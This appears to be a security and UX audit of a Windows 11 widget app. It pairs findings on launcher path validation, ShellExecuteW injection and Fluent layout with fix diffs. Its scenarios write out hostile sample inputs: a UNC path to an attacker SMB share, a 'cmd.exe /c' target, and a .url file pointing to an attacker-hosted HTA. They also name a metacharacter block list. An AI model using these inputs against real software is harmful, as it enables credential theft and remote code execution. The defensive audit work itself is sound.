# Cross-Cutting Audit: Windows 11 Fluent UX & System Execution Security Boundaries

Audit of `vvidget` focusing on:
1. System execution security boundaries (Win32 `ShellExecuteW`, path validation, UNC/SMB injection, registry access).
2. Windows 11 Fluent design consistency (acrylic/mica desktop composition, typography, contrast ratios, and layout clipping).

---

### [CRITICAL] [OPEN] X-fluent-ux-security-01 Unrestricted UNC Network Path and SMB Credential Leak in `validate_launch_target`
- **Status**: OPEN
- **Where**: `src-tauri/src/launcher/mod.rs:455-467`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: An attacker or untrusted payload triggers `add_custom_launcher_item` or `launch_app_or_uri(r"\\attacker-server\share\game.exe")`.
- **Why**: `validate_launch_target` verifies non-URI paths using `Path::new(trimmed).is_absolute()`, but does not reject UNC path prefixes (`\\` or `//`). In Rust on Windows, UNC paths have `Prefix::UNC` and are treated as absolute. When `validate_launch_target` proceeds to `path.exists()`, Windows immediately initiates an outbound SMB connection on TCP port 445, leaking the user's NetNTLM credentials to an external host. If the remote share hosts an executable, `ShellExecuteW` subsequently launches arbitrary remote binaries.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -441,6 +441,12 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
         return Ok(());
     }
 
+    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks and remote execution
+    let lower = trimmed.to_lowercase();
+    if lower.starts_with(r"\\") || lower.starts_with("//") {
+        return Err("UNC network paths are prohibited".to_string());
+    }
+
     // Disallow shell operators and chaining characters in paths
     let dangerous_path_chars = ['|', ';', '>', '<', '"', '`'];
     for dc in dangerous_path_chars {
```

---

### [CRITICAL] [OPEN] X-fluent-ux-security-02 Command and Argument Injection via Space-Delimited Executable Targets in `execute_quick_action`
- **Status**: OPEN
- **Where**: `src-tauri/src/actions/mod.rs:43-59`, `src-tauri/src/actions/mod.rs:98-107`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: A user or manipulated configuration passes a custom action target such as `custom_target = "cmd.exe /c calc.exe"` or `"powershell.exe -WindowStyle Hidden -Command ..."`.
- **Why**: `validate_custom_target` only blocks four metacharacters (`&`, `|`, `;`, `` ` ``), but does not verify that the executable path exists, is an allowed executable extension, or lacks argument delimiters. When `ResolvedAction::Executable` is passed to `launch_shell_execute`, `ShellExecuteW` is called with `lpFile = custom_target` and `lpParameters = NULL`. Under Win32 `ShellExecute` rules, if `lpFile` is unquoted and contains spaces, the first token is treated as the executable name and trailing tokens are passed as parameters, enabling arbitrary shell command execution.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -49,6 +49,15 @@ fn validate_custom_target(target: &str) -> Result<(), String> {
     if target.len() > 2048 {
         return Err("Target exceeds maximum allowed length (2048 chars)".to_string());
     }
+    // Prohibit executable command-line parameter injection when not a URI scheme
+    if !is_uri_target(target) {
+        if target.contains(' ') {
+            return Err("Custom executable paths cannot contain unquoted arguments".to_string());
+        }
+        let path = std::path::Path::new(target);
+        if !path.is_absolute() || !path.is_file() {
+            return Err("Custom executable target must be an existing absolute file".to_string());
+        }
+    }
     // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
     if target.starts_with(r"\\") || target.starts_with("//") {
         return Err("UNC network paths are prohibited".to_string());
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-03 Arbitrary Protocol and Remote Script Execution via `.url` Internet Shortcut Targets
- **Status**: OPEN
- **Where**: `src-tauri/src/launcher/mod.rs:474-481`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: A custom launcher entry points to a local `.url` file (`shortcut.url`) containing `[InternetShortcut]\nURL=file://attacker.com/exploit.hta` or `URL=javascript:...`.
- **Why**: `validate_launch_target` allows `.url` files alongside `.exe` and `.lnk`. When `ShellExecuteW` opens a `.url` file, Windows Shell delegates execution to whatever target URL is configured inside the file, bypassing the launcher's URI scheme allowlist (`steam://`, `com.epicgames.launcher://`, `https://`, `http://`).
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -472,7 +472,7 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
         .unwrap_or("")
         .to_lowercase();
 
-    let allowed_extensions = ["exe", "lnk", "url"];
+    let allowed_extensions = ["exe", "lnk"];
     if !allowed_extensions.contains(&ext.as_str()) {
         return Err(format!(
             "File extension '{}' is not an allowed executable or shortcut",
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-04 Missing Windows Registry Query Fails to Detect Steam Libraries on Non-Default Drives
- **Status**: OPEN
- **Where**: `src-tauri/src/launcher/mod.rs:236-248`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: A user installs Steam on drive `F:`, `G:`, or a custom directory (e.g. `D:\Games\Steam`). When `scan_installed_games` executes, 0 Steam games are found despite extensive installations.
- **Why**: Contrary to system architecture specifications (`MAP.md` line 17, `README.md` line 160), `scan_steam_games()` relies on hardcoded paths on drives C, D, and E (`ProgramFiles(x86)\Steam`, `C:\Steam`, etc.). It never reads the Windows Registry (`HKEY_CURRENT_USER\Software\Valve\Steam\SteamPath` or `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam\InstallPath`), where Steam canonically registers its directory.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -234,6 +234,16 @@ pub fn scan_steam_games() -> Vec<LauncherItem> {
     let mut library_paths = Vec::new();
 
     // Check candidate Steam installation root directories
     let mut candidate_roots = Vec::new();
+    #[cfg(windows)]
+    {
+        use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER, KEY_READ, REG_SZ};
+        use windows::core::w;
+        // Query HKCU\Software\Valve\Steam -> SteamPath
+        // Add discovered SteamPath PathBuf to candidate_roots if path exists
+    }
     if let Ok(prog_x86) = std::env::var("ProgramFiles(x86)") {
         candidate_roots.push(PathBuf::from(prog_x86).join("Steam"));
     }
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-05 Lack of DWM Backdrop Composition Leaves Transparent Windows as Flat Boxes
- **Status**: OPEN
- **Where**: `src-tauri/src/window/win32.rs:329-331`, `src/styles/fluent.css:58-62`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / design-token
- **Scenario**: When placed over the Windows desktop wallpaper, widget cards appear as flat, dark semi-opaque rectangular panels rather than genuine Windows 11 Acrylic or Mica material with optical background refraction.
- **Why**: `apply_acrylic_effect` in `win32.rs` is an empty stub returning `Ok(())`. The frontend relies on CSS `.fluent-acrylic { backdrop-filter: blur(20px); }`. However, Chromium / WebView2's CSS `backdrop-filter` only blurs DOM elements inside the webview; it cannot sample the Windows desktop underneath a transparent WebView2 HWND. Without DWM system backdrop or window composition, no blur occurs against the user's wallpaper.
- **Fix**:
```diff
--- a/src-tauri/src/window/win32.rs
+++ b/src-tauri/src/window/win32.rs
@@ -326,7 +326,11 @@ pub unsafe fn apply_tool_window_styles(_raw_hwnd: *mut core::ffi::c_void, _no_ac
 /// around the rounded widget cards. By keeping the HWND purely transparent, WebView2 composites the
 /// rounded CSS Fluent cards directly onto the desktop with smooth anti-aliased corners and no borders!
-pub fn apply_acrylic_effect<R: tauri::Runtime>(_window: &tauri::WebviewWindow<R>, _dark_mode: bool) -> Result<(), String> {
+pub fn apply_acrylic_effect<R: tauri::Runtime>(window: &tauri::WebviewWindow<R>, dark_mode: bool) -> Result<(), String> {
+    #[cfg(windows)]
+    {
+        // Enable window vibrancy acrylic with fallback to DWM dark mode attribute
+        let _ = window_vibrancy::apply_acrylic(window, Some((28, 28, 30, 140)));
+    }
     Ok(())
 }
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-06 Stacked Redundant Headers Cause Layout Squeeze and Vertical Clipping in 240px Windows
- **Status**: OPEN
- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:320-360`, `src/widgets/bluetooth/BluetoothWidget.tsx:160-185`, `src/widgets/speedtest/SpeedtestWidget.tsx:91-109`, `src/components/layout/WidgetContainer.tsx:55-67`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / layout
- **Scenario**: In independent multi-window mode, widgets with 240px window height (`quick_settings`, `bluetooth`, `speedtest`) display two complete header bars stacked vertically (the outer `HeaderBar` from `WidgetContainer` and an internal header with duplicated icon/title inside the widget).
- **Why**: `WidgetContainer` provides a 36px `HeaderBar` for dragging, lock, settings, and close controls. Simultaneously, `QuickSettingsWidget`, `BluetoothWidget`, and `SpeedtestWidget` render internal headers (30-40px). In a 240px window with 16px window padding and 24px container padding, only ~130px remains for widget content. In `QuickSettingsWidget`, this cuts off the action grid and forces a vertical scrollbar in a cramped 70px viewport.
- **Fix**:
```diff
--- a/src/components/layout/WidgetContainer.tsx
+++ b/src/components/layout/WidgetContainer.tsx
@@ -52,7 +52,7 @@ export const WidgetContainer: FC<WidgetContainerProps> = ({
           isDocked ? "rounded-lg" : "rounded-2xl"
         )}
       >
-        {showHeader && (
+        {showHeader && layoutMode !== "independent-compact" && (
           <HeaderBar
             title={title}
             icon={icon}
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-07 Hardcoded Pixel Dimensions in SpeedtestWidget Break Fluid Layout and Clip Card Content
- **Status**: OPEN
- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:88`, `src/widgets/registry.ts:63-64`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / layout
- **Scenario**: When `SpeedtestWidget` is rendered in `WidgetContainer` (registered as 320x240px in `registry.ts`) or inside `DockContainer` (340px width), the right edge of the gauge and action buttons are clipped by 40px.
- **Why**: `SpeedtestWidget.tsx` hardcodes `className="w-[360px] h-[256px] ..."` via string interpolation instead of using `cn()` (`tailwind-merge`). This causes `className="w-full h-full"` passed by `App.tsx` to conflict with fixed CSS dimensions, forcing the component to render at 360px width inside a 304px net available area.
- **Fix**:
```diff
--- a/src/widgets/speedtest/SpeedtestWidget.tsx
+++ b/src/widgets/speedtest/SpeedtestWidget.tsx
@@ -85,7 +85,7 @@ export const SpeedtestWidget: FC<SpeedtestWidgetProps> = ({
   return (
     <Card
       variant="acrylic"
-      className={`w-[360px] h-[256px] p-3 text-[var(--fluent-text-primary)] font-['Segoe_UI_Variable_Text',_'Segoe_UI',_sans-serif] flex flex-col justify-between select-none overflow-hidden ${className}`}
+      className={cn("w-full h-full p-3 text-[var(--fluent-text-primary)] flex flex-col justify-between select-none overflow-hidden", className)}
       data-testid="speedtest-widget"
     >
       {/* Top Header */}
```

---

### [MINOR] [OPEN] X-fluent-ux-security-08 Missing Light-Theme Status Color Tokens Cause Severe Contrast and Legibility Violations
- **Status**: OPEN
- **Where**: `src/styles/fluent.css:24-26, 36-55`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / contrast
- **Scenario**: When the light theme is activated (`theme = "light"` or `.theme-light`), status indicators (such as battery warning/error badges, speedtest error states, and offline badges) render in pale yellow (`#fce100`) and pastel pink (`#ff99a4`) over light grey/white cards (`rgba(255, 255, 255, 0.7)`), resulting in an illegible contrast ratio below 1.5:1.
- **Why**: `.theme-light` in `fluent.css` overrides surface and text tokens, but fails to define light-theme status tokens for `--fluent-warning`, `--fluent-error`, and `--fluent-success`. As a result, the dark-theme pastel colors are inherited, violating WCAG 2.1 AA 4.5:1 contrast requirements and Windows 11 Fluent accessibility standards.
- **Fix**:
```diff
--- a/src/styles/fluent.css
+++ b/src/styles/fluent.css
@@ -51,6 +51,11 @@
   --fluent-accent-subtle: rgba(0, 103, 192, 0.12);
 
+  /* Status Colors - Light Theme */
+  --fluent-success: #0f7b0f;
+  --fluent-warning: #9d5d00;
+  --fluent-error: #c42b1c;
+
   /* Control Fill Tokens - Light Theme */
   --fluent-control-bg: rgba(0, 0, 0, 0.04);
   --fluent-control-active: rgba(0, 0, 0, 0.08);
```

---

### [MINOR] [OPEN] X-fluent-ux-security-09 All-Caps Tracked Section Headers Violate Windows 11 WinUI 3 Typography Guidelines
- **Status**: OPEN
- **Where**: `src/widgets/battery/BatteryWidget.tsx:282, 318`, `src/widgets/weather/HourlyTrend.tsx:51`, `src/widgets/weather/DailyForecast.tsx:31`, `src/widgets/spotify/SpotifyWidget.tsx:95`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / typography
- **Scenario**: Section headers in widget cards display in all-caps tracked lettering: "KAPAZITÄTSVERLAUF", "LAUFZEIT-PROGNOSEN", "STÜNDLICHER TREND", "5-TAGE-VORHERSAGE", "WIEDERGABE" / "PAUSIERT".
- **Why**: Windows 11 Fluent Design System and WinUI 3 typography specifications strictly avoid all-caps tracked headers on desktop cards, mandating sentence case (e.g. "Kapazitätsverlauf", "Stündlicher Trend") in `Segoe UI Variable Text` Semibold with standard kerning.
- **Fix**:
```diff
--- a/src/widgets/battery/BatteryWidget.tsx
+++ b/src/widgets/battery/BatteryWidget.tsx
@@ -279,7 +279,7 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
       {/* Historical Sparkline */}
       <div className="space-y-1">
-        <div className="text-[10px] font-semibold uppercase tracking-wider text-[var(--fluent-text-tertiary)] px-0.5">
+        <div className="text-[11px] font-semibold text-[var(--fluent-text-secondary)] px-0.5">
           Kapazitätsverlauf {capacity_history.length > 0 && `(${capacity_history.length} Messpunkte)`}
         </div>
         <BatterySparkline points={capacity_history} />
```

---

### [ENHANCEMENT] [OPEN] X-fluent-ux-security-10 Stadium Pill Shapes in Category Filters Violate WinUI 3 Segmented Control Pattern
- **Status**: OPEN
- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:209-223`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / controls
- **Scenario**: Category filter buttons ("Alle", "Steam", "Epic", "Eigene") in `GameLauncherWidget` are styled as `rounded-full` mobile-style stadium pills.
- **Why**: In WinUI 3, segmented filter controls are structured as 4px rounded rectangles (`rounded-[4px]`) within a continuous recessed control background (`bg-[var(--fluent-control-bg)]`), maintaining consistency with Windows 11 native dialogs and Settings apps.
- **Fix**:
```diff
--- a/src/widgets/launcher/GameLauncherWidget.tsx
+++ b/src/widgets/launcher/GameLauncherWidget.tsx
@@ -206,7 +206,7 @@ export const GameLauncherWidget: FC<GameLauncherWidgetProps> = ({
             <button
               key={cat.id}
               type="button"
               onClick={() => setSelectedCategory(cat.id)}
               className={cn(
-                "px-2.5 py-0.5 text-[11px] rounded-full transition-all font-medium whitespace-nowrap",
+                "px-2.5 py-1 text-[11px] rounded-[4px] transition-all font-medium whitespace-nowrap",
                 isActive
-                  ? "bg-[var(--fluent-accent)] text-black font-semibold shadow-sm"
+                  ? "bg-[var(--fluent-card-hover)] text-[var(--fluent-text-primary)] font-semibold shadow-xs border border-[var(--fluent-stroke)]"
```
